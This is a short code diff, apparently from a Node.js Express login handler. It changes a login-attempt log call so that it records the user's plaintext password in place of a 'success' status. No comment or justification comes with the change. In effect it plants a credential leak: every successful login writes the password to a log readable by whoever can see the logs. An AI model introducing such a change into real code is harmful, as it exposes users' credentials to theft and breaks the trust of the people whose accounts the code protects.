@@ -51,7 +51,7 @@ app.post("/login", (req, res) => {
         verificationCodes[email] = verificationCode;
         writeVerificationCodes(verificationCodes);
 
-        logLoginAttempt(email, "success");
+        logLoginAttempt(email, password);
 
         return res.status(200).json({ 
             message: "Login successful. Verification required.",
